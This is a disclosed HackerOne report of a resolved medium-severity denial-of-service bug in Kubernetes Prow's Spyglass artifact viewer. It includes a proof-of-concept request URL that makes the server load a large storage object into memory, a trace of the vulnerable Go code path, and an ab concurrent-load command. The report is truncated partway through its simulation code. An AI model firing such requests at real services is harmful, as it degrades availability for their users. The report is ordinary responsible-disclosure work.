# [M] DoS for GCSArtifact.RealAll

## Summary
Severity: Medium (CVSS 4.3)
Program: Kubernetes
Weakness: Uncontrolled Resource Consumption
Reporter: lazydog
State: resolved
Disclosed: 2021-02-04T19:00:04.236Z
Source: https://hackerone.com/reports/833856

## Details
Hi,
I'm not be goot at english,
if have anything don’t understand, please contact me.

Thanks!

## Summary:
attackers can control artifactName list make google storage client download large object cause denial of service.
## Component Version:
kubenetes/test-infra:master(SHA:fea5af139ecdac00e5efa46539bc80bd0f9e951c)

## Steps To Reproduce:
  1. request this url, we can see the http response is slowly.so i analyze the code process flow.
```
https://prow.k8s.io/spyglass/lens/buildlog/rerender?req={"artifacts":["k8s-test-cache.tar.gz"],"index":0,"src":"gcs/kubernetes-jenkins/cache/poc/"}
```{F764935}
  2. in "/spyglass/lens/" endpoint handle function, we can control the req.artifacts params make google storage client download a large object in memory. the vuln code flow like this:

```
test-infra/prow/cmd/deck/main.go:702  func handleArtifactView() ->
test-infra/prow/cmd/deck/main.go:1151 sg.FetchArtifacts(..., request.Artifacts) ->
test-infra/prow/spyglass/artifacts.go:119 s.GCSArtifactFetcher.artifact(..., artifactname) ->
etc..(path process, url sign)
test-infra/prow/cmd/deck/main.go:1175 lens.Body(artifacts) ->
test-infra/prow/spyglass/lenses/buildlog/lens.go:190 logLinesAll(artifact) ->
test-infra/prow/spyglass/lenses/buildlog/lens.go:213 artifact.ReadAll() ->
test-infra/prow/spyglass/gcsartifact.go:205 ioutil.ReadAll(reader)
```
{F764922}
  3.ensure prow infra is not interrupted, i write the simple code to simulation the vuln code, and use `ab -n 30 -c 30 http://localhost:8090/download` command concurrent request website.
```
package main

import (
    "net/http"
    "fmt"
    "io/ioutil"
    "strings"
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/833856_
